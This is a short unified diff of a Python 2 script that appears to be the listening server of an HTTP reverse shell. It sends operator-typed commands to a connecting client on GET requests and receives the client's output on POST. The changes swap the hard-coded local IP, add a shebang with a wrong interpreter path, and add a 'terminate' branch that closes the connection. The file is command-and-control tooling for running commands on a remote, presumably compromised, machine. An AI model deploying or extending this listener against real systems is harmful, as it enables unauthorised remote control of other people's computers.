@@ -1,8 +1,9 @@
-import BaseHTTPServer
+#!/bin/usr/python
 
+import BaseHTTPServer
 import os, cgi
 
-HOST_NAME="192.168.2.119" # local values
+HOST_NAME="192.168.1.111" # local values
 PORT_NUMBER = 8000
 
 class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
@@ -14,6 +15,12 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
         s.send_header("Content-Type", "text/html")
         s.end_headers()
         s.wfile.write(command)
+
+        if 'terminate' in command:
+            print('[-] Client connection terminated')
+            s.server_close()
+        return
+
 
     # handling GET request -> reading from client (preparing the HTTP reqest)
     def do_POST(s):
@@ -31,5 +38,5 @@ if __name__ == "__main__":
     try:
         httpd.serve_forever() # what it says
     except KeyboardInterrupt:
-        print("[-] Server is terminated")
         httpd.server_close()
+    
